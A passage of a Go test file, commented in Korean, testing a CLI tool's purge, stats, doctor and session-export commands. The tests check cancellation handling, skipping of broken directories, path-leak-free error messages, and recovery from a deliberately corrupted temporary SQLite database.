	defer st2.Close()
	var n int
	if err := st2.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
		t.Fatal(err)
	}
	if n != 0 {
		t.Fatalf("sources=%d want 0(선택 삭제도 함께 수행돼야 함)", n)
	}
}

// TestRunPurge_All_ContextCanceledStopsBeforeAnyDeletion: --all로 프로젝트 2개를 대상할 때
// 이미 취소된 ctx를 주면 순회 첫 반복에서 즉시 멈춰야 한다(설계 §7 review 항목 — 다중 프로젝트
// 순회의 주기적 ctx 검사) — 오류를 반환하고, 두 프로젝트 중 어느 쪽도 삭제되지 않아야 한다.
// force=true로 확인 자체는 통과시켜(비TTY) 루프 진입 이후의 취소 검사만 순수하게 검증한다.
func TestRunPurge_All_ContextCanceledStopsBeforeAnyDeletion(t *testing.T) {
	storeRoot := t.TempDir()
	ids := make([]string, 2)
	for i := range ids {
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		ids[i] = canon.ProjectID
		projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
		st, err := store.Open(projDir, false)
		if err != nil {
			t.Fatalf("store.Open: %v", err)
		}
		if _, err := st.Register(t.Context(), store.Registration{
			StoredBytes: []byte("data"), MediaType: "text/plain",
			Source: store.SourceMeta{URI: "/d.txt", Kind: "file", SrcHash: "h"},
			Chunks: []store.Chunk{{Ordinal: 0, Text: "data"}},
		}); err != nil {
			t.Fatalf("register: %v", err)
		}
		if err := st.Close(); err != nil {
			t.Fatalf("close: %v", err)
		}
	}

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	var out bytes.Buffer
	err := runPurge(ctx, failReader{}, &out, io.Discard, storeRoot, []string{"--all", "--force"}, false)
	if err == nil {
		t.Fatal("want error for canceled context, got nil")
	}

	for _, id := range ids {
		projDir := filepath.Join(storeRoot, "projects", id)
		st, err := store.Open(projDir, true)
		if err != nil {
			t.Fatalf("reopen %s: %v", id, err)
		}
		var n int
		if err := st.Reader().QueryRow("SELECT count(*) FROM sources").Scan(&n); err != nil {
			t.Fatal(err)
		}
		st.Close()
		if n != 1 {
			t.Fatalf("project %s: sources=%d want 1(취소로 무삭제여야 함)", id, n)
		}
	}
}

// TestRunPurge_All_PartiallyCreatedDirRemovedNotFailStuck: 최종리뷰 F3 — lock 타임아웃·
// migrate 실패·크래시가 artifacts/만 남기고 content.db가 없는 부분 생성 디렉터리를
// projects/ 밑에 남길 수 있다. --all --force(전체삭제 모드, --older-than 없음)가 이런
// 디렉터리와 정상 프로젝트를 함께 순회할 때, 예전엔 첫 os.Stat(content.db) 실패에서 즉시
// 전체 중단돼 정상 프로젝트도 못 지웠다 — 이제는 깨진 디렉터리를 정리 목적에 맞게
// RemoveAll하고 정상 프로젝트도 계속 처리해야 한다(양쪽 다 사라져야 함).
func TestRunPurge_All_PartiallyCreatedDirRemovedNotFailStuck(t *testing.T) {
	storeRoot := t.TempDir()

	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	goodDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(goodDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("data"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/d.txt", Kind: "file", SrcHash: "h"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "data"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	// 부분 생성 디렉터리 모사: content.db 없이 artifacts/만 존재.
	brokenDir := filepath.Join(storeRoot, "projects", "broken-partial-dir")
	if err := os.MkdirAll(filepath.Join(brokenDir, "artifacts"), 0o700); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, []string{"--all", "--force"}, false); err != nil {
		t.Fatalf("runPurge --all --force: %v (out=%s)", err, out.String())
	}

	if _, statErr := os.Stat(goodDir); !os.IsNotExist(statErr) {
		t.Fatalf("정상 프로젝트가 삭제되지 않음: stat err=%v", statErr)
	}
	if _, statErr := os.Stat(brokenDir); !os.IsNotExist(statErr) {
		t.Fatalf("깨진 디렉터리가 정리되지 않음: stat err=%v", statErr)
	}
}

// TestRunPurge_All_Selective_PartiallyCreatedDirSkipped: 선택 삭제 모드(--older-than)에서는
// content.db가 없는 디렉터리를 지울 근거(indexed_at)가 없으므로 RemoveAll하지 않고 skip
// 보고만 하며, 나머지 정상 프로젝트는 계속 처리해야 한다(F3).
func TestRunPurge_All_Selective_PartiallyCreatedDirSkipped(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	goodDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(goodDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	if _, err := st.Register(t.Context(), store.Registration{
		StoredBytes: []byte("data"), MediaType: "text/plain",
		Source: store.SourceMeta{URI: "/d.txt", Kind: "file", SrcHash: "h"},
		Chunks: []store.Chunk{{Ordinal: 0, Text: "data"}},
	}); err != nil {
		t.Fatalf("register: %v", err)
	}
	if err := st.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	brokenDir := filepath.Join(storeRoot, "projects", "broken-partial-dir")
	if err := os.MkdirAll(filepath.Join(brokenDir, "artifacts"), 0o700); err != nil {
		t.Fatal(err)
	}

	var out bytes.Buffer
	args := []string{"--all", "--force", "--older-than", "1ns"}
	if err := runPurge(context.Background(), failReader{}, &out, io.Discard, storeRoot, args, false); err != nil {
		t.Fatalf("runPurge: %v (out=%s)", err, out.String())
	}
	if _, statErr := os.Stat(brokenDir); statErr != nil {
		t.Fatalf("선택 삭제 모드에서 깨진 디렉터리가 임의로 지워짐: stat err=%v", statErr)
	}
	if !strings.Contains(out.String(), "broken-partial-dir") {
		t.Fatalf("skip 보고 누락: out=%s", out.String())
	}
}

// TestRunStats_Local: 임시 store에 LedgerAppend 3건(도구 2종)을 넣고 Run(ctx,"stats",...)을
// 호출해 로컬 ledger 집계 표를 확인한다(설계 §6) — 두 도구명 모두·"bytes suppressed" 고정
// 문구 포함, "token"/"$" 문자열은 어디에도 없어야 한다(토큰·달러 환산·절약률 주장 금지,
// §6 차단 항목).
func TestRunStats_Local(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
	st, err := store.Open(projDir, false)
	if err != nil {
		t.Fatalf("store.Open: %v", err)
	}
	st.LedgerAppend("ctr_fetch_and_index", 1000, 20, 5)
	st.LedgerAppend("ctr_fetch_and_index", 500, 30, 4)
	st.LedgerAppend("ctr_search", 50, 500, 3)
	if err := st.Close(); err != nil {
		t.Fatalf("store.Close: %v", err)
	}

	var out, errOut bytes.Buffer
	if err := Run(context.Background(), "stats", nil, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run stats err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{"ctr_fetch_and_index", "ctr_search", "bytes suppressed (local, 진단용)"} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
	for _, banned := range []string{"token", "$"} {
		if strings.Contains(got, banned) {
			t.Fatalf("out must not contain %q (환산·절약 금지, 설계 §6): %s", banned, got)
		}
	}
}

// TestRunStats_Local_NoLedger: ledger.db가 아예 없는(=store를 한 번도 연 적 없는) 프로젝트에서도
// stats는 오류 없이 표(빈 본문 + 합계 0줄)를 출력해야 한다 — LedgerStats의 "미존재 → 빈 슬라이스"
// 계약이 cli까지 그대로 이어지는지 확인한다.
func TestRunStats_Local_NoLedger(t *testing.T) {
	var out, errOut bytes.Buffer
	if err := Run(context.Background(), "stats", nil, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run stats err=%v out=%s", err, out.String())
	}
	got := out.String()
	if !strings.Contains(got, "bytes suppressed (local, 진단용)") {
		t.Fatalf("out missing fixed suppression phrase: %s", got)
	}
	for _, banned := range []string{"token", "$"} {
		if strings.Contains(got, banned) {
			t.Fatalf("out must not contain %q: %s", banned, got)
		}
	}
}

// TestRunStats_Provider: 임시 JSONL 3줄(usage 2건 + 파싱 불가 1건)을 스캔해 실측 토큰 합계와
// skipped 카운트를 검증한다(설계 §6 provider 계약) — 절약 주장·비교 문구는 없다(실측 합계만).
func TestRunStats_Provider(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")
	lines := []string{
		`{"message":{"usage":{"input_tokens":100,"output_tokens":20,"cache_read_input_tokens":5,"cache_creation_input_tokens":1}}}`,
		`{"message":{"usage":{"input_tokens":50,"output_tokens":10,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}`,
		`not valid json`,
	}
	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"--provider", path}
	if err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run stats --provider err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{
		"input_tokens: 150", "output_tokens: 30",
		"cache_read_input_tokens: 5", "cache_creation_input_tokens: 1",
		"skipped: 1",
	} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
}

// TestRunStats_Provider_FileMissing: --provider 경로가 없으면 오류를 반환해야 한다(침묵 무시
// 금지). 반환 오류 문구에 그 경로 자체가 섞여선 안 된다(§12 canary, 리뷰 Fix Round 2 Critical
// (a) — os.Open이 반환하는 *fs.PathError는 절대경로를 담는다).
func TestRunStats_Provider_FileMissing(t *testing.T) {
	var out, errOut bytes.Buffer
	missing := filepath.Join(t.TempDir(), "missing.jsonl")
	args := []string{"--provider", missing}
	err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for missing --provider file, got nil")
	}
	if strings.Contains(err.Error(), missing) {
		t.Fatalf("error must not leak the path: %v", err)
	}
}

// TestRunStats_Local_ProjectIdentifyFailure: projectRoot가 존재하지 않아 ident.Canonicalize가
// 실패하는 경우도 오류를 반환해야 하고, 그 오류 문구에 projectRoot 경로가 섞여선 안 된다
// (§12 canary, 리뷰 Fix Round 2 Critical (b) — Canonicalize의 원인은 *fs.PathError).
func TestRunStats_Local_ProjectIdentifyFailure(t *testing.T) {
	storeRoot := t.TempDir()
	missingProject := filepath.Join(t.TempDir(), "does-not-exist")

	var out, errOut bytes.Buffer
	err := Run(context.Background(), "stats", nil, storeRoot, missingProject, "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for nonexistent project root, got nil")
	}
	if strings.Contains(err.Error(), missingProject) {
		t.Fatalf("error must not leak the path: %v", err)
	}
}

// TestRunStats_Provider_OversizedLine: 10MB(maxProviderLine) 상한을 넘는 한 줄이 있어도 명령
// 전체가 중단되면 안 된다 — 그 줄만 skipped로 세고 그 앞뒤 정상 줄은 계속 합산해야 한다(리뷰
// Fix Round 2, Important-3 — 예전 bufio.Scanner 고정버퍼 구현은 이 경우 Scan() 자체가
// 실패해 명령 전체가 오류로 끝났다). 긴 줄은 strings.Repeat로 생성한다(리터럴 금지).
func TestRunStats_Provider_OversizedLine(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")

	huge := `{"message":{"usage":{"input_tokens":1,"padding":"` + strings.Repeat("x", 11<<20) + `"}}}`
	lines := []string{
		`{"message":{"usage":{"input_tokens":9,"output_tokens":1,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}`,
		huge,
	}
	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")+"\n"), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"--provider", path}
	if err := Run(context.Background(), "stats", args, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run stats --provider err=%v out=%s", err, out.String())
	}
	got := out.String()
	for _, want := range []string{"input_tokens: 9", "output_tokens: 1", "usage records: 1", "skipped: 1"} {
		if !strings.Contains(got, want) {
			t.Fatalf("out missing %q: %s", want, got)
		}
	}
}

// TestRunDoctor_UnexpectedArgs / TestRunUpgrade_UnexpectedArgs: doctor·upgrade는 args를
// 소비하지 않으므로 잔여 인자를 침묵 수용하면 안 된다(리뷰 Fix Round 2, Important-2) —
// 미지 인자가 있으면 명시적으로 오류여야 한다. 오류 문구에는 사용자가 입력한 원문("--bogus")이
// 그대로 에코되면 안 된다(규약 §6, 리뷰 Fix Round 3 item 5 — 개수만 밝힌다).
func TestRunDoctor_UnexpectedArgs(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "doctor", []string{"--bogus"}, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected doctor args, got nil")
	}
	if strings.Contains(err.Error(), "--bogus") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

func TestRunUpgrade_UnexpectedArgs(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "upgrade", []string{"--bogus"}, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected upgrade args, got nil")
	}
	if strings.Contains(err.Error(), "--bogus") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

// TestRunStats_UnexpectedPositionalArg: flag.Parse가 소비하지 못한 위치 인자(예: --provider
// 없이 그냥 파일명만 넘긴 경우)를 침묵 수용하면 안 된다(리뷰 Fix Round 3, item 4).
func TestRunStats_UnexpectedPositionalArg(t *testing.T) {
	var out, errOut bytes.Buffer
	err := Run(context.Background(), "stats", []string{"provider.jsonl"}, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for unexpected positional arg, got nil")
	}
	if strings.Contains(err.Error(), "provider.jsonl") {
		t.Fatalf("error must not echo raw user input: %v", err)
	}
}

// TestRunStats_Provider_ContextCanceled: 이미 취소된 ctx로 stats --provider를 호출하면
// 오류로 중단해야 한다(리뷰 Fix Round 3, item 7) — 취소 확인은 cancelCheckLines(256)줄마다
// 이루어지는데, lineNo=0에서 첫 확인이 스캔 시작 전에 실행되므로 파일이 짧아도(1줄) 검증된다.
func TestRunStats_Provider_ContextCanceled(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "transcript.jsonl")
	line := `{"message":{"usage":{"input_tokens":1,"output_tokens":1,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}` + "\n"
	if err := os.WriteFile(path, []byte(line), 0o600); err != nil {
		t.Fatalf("write transcript: %v", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	cancel()

	var out, errOut bytes.Buffer
	err := Run(ctx, "stats", []string{"--provider", path}, t.TempDir(), t.TempDir(), "0.0.1-dev", &out, &errOut)
	if err == nil {
		t.Fatal("want error for canceled context, got nil")
	}
}

// TestRunDoctor_StoreRootDeepMissingParents_Writable: storeRoot의 부모·조부모가 전부
// 미생성이어도(딱 한 단계 위까지도 없는 신규 배치) store.Open의 MkdirAll이 계층 전체를 한
// 번에 만들 수 있으므로 writable=true로 판정해야 한다(리뷰 Fix Round 3, item 2 — 예전
// 구현은 filepath.Dir 한 단계만 봐서 이 경우 항상 writable=false로 오판했다).
func TestRunDoctor_StoreRootDeepMissingParents_Writable(t *testing.T) {
	isolateCodexHome(t)
	base := t.TempDir()
	storeRoot := filepath.Join(base, "a", "b", "c") // a,b,c 전부 미생성
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "[1] store-root: exists=false writable=true") {
		t.Fatalf("out missing writable=true for deep-missing store-root: %s", buf.String())
	}
	if _, err := os.Stat(storeRoot); !os.IsNotExist(err) {
		t.Fatalf("store root must not be created by doctor: stat err=%v", err)
	}
}

// TestRunDoctor_StoreRootAncestorIsFile_Rejected: 최종리뷰 F6 — storeRoot 자신이 아니라
// 그 중간 조상이 일반 파일이면 os.Stat(storeRoot)이 ENOTDIR로 실패한다. 예전
// nearestExistingDir는 `err == nil && fi.IsDir()`를 종료 조건으로 삼아 그 비디렉터리
// 조상을 그냥 지나쳐 위의 진짜 디렉터리에서 probeWritable을 실행해 writable=true를
// 오판 보고했다 — 실제로는 store.Open의 MkdirAll이 그 파일을 뚫고 지나갈 수 없어 항상
// 실패한다. ENOTDIR(비디렉터리 조상)은 미존재와 구분해 writable=false로 즉시 실패
// 보고해야 한다.
func TestRunDoctor_StoreRootAncestorIsFile_Rejected(t *testing.T) {
	isolateCodexHome(t)
	base := t.TempDir()
	ancestorFile := filepath.Join(base, "ancestor-is-a-file")
	if err := os.WriteFile(ancestorFile, []byte("x"), 0o600); err != nil {
		t.Fatalf("write file: %v", err)
	}
	storeRoot := filepath.Join(ancestorFile, "store", "root") // ancestorFile은 파일 — 그 밑은 절대 생성 불가
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev")
	if err == nil {
		t.Fatal("want error — store-root의 중간 조상이 비디렉터리 파일")
	}
	if !strings.Contains(buf.String(), "[1] store-root: exists=false writable=false") {
		t.Fatalf("out missing exists=false writable=false: %s", buf.String())
	}
}

// TestRunDoctor_StoreRootIsFile_Rejected: storeRoot 위치에 이미 일반 파일이 있으면
// store.Open의 MkdirAll이 절대 성공할 수 없으므로 프로브 없이 writable=false로 명시
// 거부해야 한다(리뷰 Fix Round 3, item 2).
func TestRunDoctor_StoreRootIsFile_Rejected(t *testing.T) {
	isolateCodexHome(t)
	base := t.TempDir()
	storeRoot := filepath.Join(base, "storeroot-is-a-file")
	if err := os.WriteFile(storeRoot, []byte("x"), 0o600); err != nil {
		t.Fatalf("write file: %v", err)
	}
	projectRoot := t.TempDir()

	var buf bytes.Buffer
	err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev")
	if err == nil {
		t.Fatal("want error — store-root path is an existing non-directory file")
	}
	if !strings.Contains(buf.String(), "[1] store-root: exists=true writable=false") {
		t.Fatalf("out missing exists=true writable=false: %s", buf.String())
	}
}

// TestRunSessionExport_JSONLRoundTrip: 태스크9a Step1 ① — export가 stdout에 낸 JSONL 각 행을
// EventV1으로 파싱하면 session.Export를 직접 호출한 결과와 정확히 일치해야 한다(G6 CLI 측
// round-trip). session.Open으로 시드한 뒤 Close하고, Run(ctx,"session",["export",...])이 그
// DB를 session.OpenReadOnly로 다시 열어(별도 연결) JSONL을 낸다.
func TestRunSessionExport_JSONLRoundTrip(t *testing.T) {
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/0.1.0-test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	if _, _, _, err := d.Append(session.Event{Type: "note", Summary: "first note"}); err != nil {
		t.Fatalf("append 1: %v", err)
	}
	if _, _, _, err := d.Append(session.Event{Type: "decision", Summary: "second note"}); err != nil {
		t.Fatalf("append 2: %v", err)
	}
	want, _, err := session.Export(context.Background(), d.Reader(), 0, "", 100)
	if err != nil {
		t.Fatalf("Export(direct): %v", err)
	}
	if err := d.Close(); err != nil {
		t.Fatalf("close: %v", err)
	}

	var out, errOut bytes.Buffer
	args := []string{"export", "--project", projectRoot, "--worktree", canon.WorktreeID}
	if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err != nil {
		t.Fatalf("Run session export err=%v stderr=%s", err, errOut.String())
	}

	trimmed := strings.TrimRight(out.String(), "\n")
	if trimmed == "" {
		t.Fatalf("out empty, want %d JSONL lines", len(want))
	}
	lines := strings.Split(trimmed, "\n")
	if len(lines) != len(want) {
		t.Fatalf("got %d JSONL lines want %d: out=%s", len(lines), len(want), out.String())
	}
	for i, line := range lines {
		var ev session.EventV1
		if err := json.Unmarshal([]byte(line), &ev); err != nil {
			t.Fatalf("line %d unmarshal: %v (line=%s)", i, err, line)
		}
		if ev.EventID != want[i].EventID || ev.Summary != want[i].Summary || ev.EventType != want[i].EventType {
			t.Fatalf("line %d = %+v want %+v", i, ev, want[i])
		}
		if ev.SchemaVersion != "1.0" {
			t.Fatalf("line %d schemaVersion=%q want 1.0", i, ev.SchemaVersion)
		}
	}
	for _, forbidden := range []string{`"RowID"`, `"rowID"`, `"row_id"`, `"rowid"`} {
		if strings.Contains(out.String(), forbidden) {
			t.Fatalf("JSONL leaks internal cursor field %s: %s", forbidden, out.String())
		}
	}
}

// TestRunSessionExport_WorktreeContract: 태스크9a Step1 ② — worktree가 2개면 --worktree 없이는
// 후보 목록을 stderr에 출력하고 오류(설계 §7 worktree 특정 계약), 1개면 생략 허용.
func TestRunSessionExport_WorktreeContract(t *testing.T) {
	t.Run("multiple_without_flag_lists_candidates_and_errors", func(t *testing.T) {
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		projDir := filepath.Join(storeRoot, "projects", canon.ProjectID)
		for _, wid := range []string{"wt-a", "wt-b"} {
			d, err := session.Open(filepath.Join(projDir, "worktrees", wid), session.Options{Producer: "context-router/test"})
			if err != nil {
				t.Fatalf("session.Open(%s): %v", wid, err)
			}
			if err := d.Close(); err != nil {
				t.Fatalf("close(%s): %v", wid, err)
			}
		}

		var out, errOut bytes.Buffer
		args := []string{"export", "--project", projectRoot}
		if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err == nil {
			t.Fatalf("want error for ambiguous worktree, got nil (out=%s)", out.String())
		}
		for _, wid := range []string{"wt-a", "wt-b"} {
			if !strings.Contains(errOut.String(), wid) {
				t.Fatalf("stderr missing candidate %q: %s", wid, errOut.String())
			}
		}
	})

	t.Run("single_without_flag_allowed", func(t *testing.T) {
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
		d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
		if err != nil {
			t.Fatalf("session.Open: %v", err)
		}
		if err := d.Close(); err != nil {
			t.Fatalf("close: %v", err)
		}

		var out, errOut bytes.Buffer
		args := []string{"export", "--project", projectRoot}
		if err := Run(context.Background(), "session", args, storeRoot, projectRoot, "0.0.1-dev", &out, &errOut); err != nil {
			t.Fatalf("Run session export(single worktree, no --worktree) err=%v stderr=%s", err, errOut.String())
		}
	})
}

// TestRunDoctor_SessionItems: 태스크9a Step1 ⑦ — doctor가 session.db quick_check·lease shared
// 프로브·session.recover-pending 마커 존재 3항목을 출력한다(설계 §7).
func TestRunDoctor_SessionItems(t *testing.T) {
	t.Run("not_initialized_is_informational_not_failure", func(t *testing.T) {
		isolateCodexHome(t)
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		var buf bytes.Buffer
		if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
			t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
		}
		out := buf.String()
		for _, want := range []string{
			"[6] session.db: not initialized",
			"[7] session.lock: not initialized",
			"[8] session.recover-pending: not initialized",
		} {
			if !strings.Contains(out, want) {
				t.Fatalf("out missing %q: %s", want, out)
			}
		}
	})

	t.Run("healthy_session_all_three_pass", func(t *testing.T) {
		isolateCodexHome(t)
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
		d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
		if err != nil {
			t.Fatalf("session.Open: %v", err)
		}
		if err := d.Close(); err != nil {
			t.Fatalf("close: %v", err)
		}

		var buf bytes.Buffer
		if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
			t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
		}
		out := buf.String()
		for _, want := range []string{
			// D42: 갓 연 세션 = 자동 세션 1건(session_start만 → empty). sessions/empty 병기.
			"[6] session.db: quick_check=ok sessions=1 (empty=1)",
			"[7] session.lock: shared 획득 가능",
			"[8] session.recover-pending: 없음",
		} {
			if !strings.Contains(out, want) {
				t.Fatalf("out missing %q: %s", want, out)
			}
		}
	})

	t.Run("recover_marker_present_counts_as_failure", func(t *testing.T) {
		isolateCodexHome(t)
		storeRoot := t.TempDir()
		projectRoot := t.TempDir()
		canon, err := ident.Canonicalize(projectRoot)
		if err != nil {
			t.Fatalf("canonicalize: %v", err)
		}
		dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)
		d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
		if err != nil {
			t.Fatalf("session.Open: %v", err)
		}
		if err := d.Close(); err != nil {
			t.Fatalf("close: %v", err)
		}
		if err := os.WriteFile(filepath.Join(dbDir, "session.recover-pending"), nil, 0o600); err != nil {
			t.Fatal(err)
		}

		var buf bytes.Buffer
		err = runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev")
		if err == nil {
			t.Fatalf("want error(진단 실패 항목 존재), got nil: %s", buf.String())
		}
		if !strings.Contains(buf.String(), "[8] session.recover-pending: 존재") {
			t.Fatalf("out missing marker-present line: %s", buf.String())
		}
	})
}

// TestDoctorEmptyExcludesSubagentLifecycle — D53: subagent_start(생애주기)만 있는 세션은 doctor
// [6] empty 카운트에서 제외(스펙 §0 상호작용 ①). 세션 2개(A=session_start 단독=empty,
// B=session_start+subagent_start=non-empty) → "sessions=2 (empty=1)" 단정.
func TestDoctorEmptyExcludesSubagentLifecycle(t *testing.T) {
	isolateCodexHome(t)
	storeRoot := t.TempDir()
	projectRoot := t.TempDir()
	canon, err := ident.Canonicalize(projectRoot)
	if err != nil {
		t.Fatalf("canonicalize: %v", err)
	}
	dbDir := filepath.Join(storeRoot, "projects", canon.ProjectID, "worktrees", canon.WorktreeID)

	// 세션 B: session_start + subagent_start → non-empty.
	db, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open(B): %v", err)
	}
	if _, _, _, err := db.Append(session.Event{Type: "subagent_start", Summary: "subagent started: Explore"}); err != nil {
		t.Fatalf("append subagent_start: %v", err)
	}
	if err := db.Close(); err != nil {
		t.Fatalf("close(B): %v", err)
	}
	// 세션 A: session_start 단독 → empty(각 Open이 새 자동 세션 1건 등록).
	da, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open(A): %v", err)
	}
	if err := da.Close(); err != nil {
		t.Fatalf("close(A): %v", err)
	}

	var buf bytes.Buffer
	if err := runDoctor(context.Background(), &buf, storeRoot, projectRoot, "0.0.1-dev"); err != nil {
		t.Fatalf("runDoctor err=%v out=%s", err, buf.String())
	}
	if !strings.Contains(buf.String(), "sessions=2 (empty=1)") {
		t.Fatalf("out missing \"sessions=2 (empty=1)\": %s", buf.String())
	}
}

// corruptSessionEvents — 태스크9b CLI 레벨 recover 테스트 전용 손상 헬퍼. session 패키지의
// recover_test.go seedAndCorruptEvents와 동일한 기법(session_events 루트 페이지의 셀 포인터
// 배열 영역 훼손 — 실측 확인: quick_check는 malformed를 보고하지만 앞부분 다수 행은 여전히
// SELECT 가능)을 cli 패키지에서 재현한다. session의 unexported 상수(dbFileName 등)에는 접근할
// 수 없으므로 session.OpenReadOnly로 필요한 값(page_size·rootpage)만 조회한다.
func corruptSessionEvents(t *testing.T, dbDir string, n int) {
	t.Helper()
	d, err := session.Open(dbDir, session.Options{Producer: "context-router/test"})
	if err != nil {
		t.Fatalf("session.Open: %v", err)
	}
	for i := 0; i < n; i++ {
		if _, _, _, err := d.Append(session.Event{Type: "note", Summary: fmt.Sprintf("evt-%d-%s", i, strings.Repeat("pad", 30))}); err != nil {
			t.Fatalf("append: %v", err)
		}
	}
	var pageSize, rootPage int
	if err := d.Reader().QueryRow("PRAGMA page_size").Scan(&pageSize); err != nil {
		t.Fatal(err)
	}
	if err := d.Reader().QueryRow("SELECT rootpage FROM sqlite_master WHERE name='session_events'").Scan(&rootPage); err != nil {
		t.Fatal(err)
	}
	if err := d.Close(); err != nil {
		t.Fatal(err)
	}

	dbPath := filepath.Join(dbDir, "session.db")
	raw, err := os.ReadFile(dbPath)
	if err != nil {
		t.Fatal(err)
	}
	off := (rootPage-1)*pageSize + 50
	if off+40 > len(raw) {
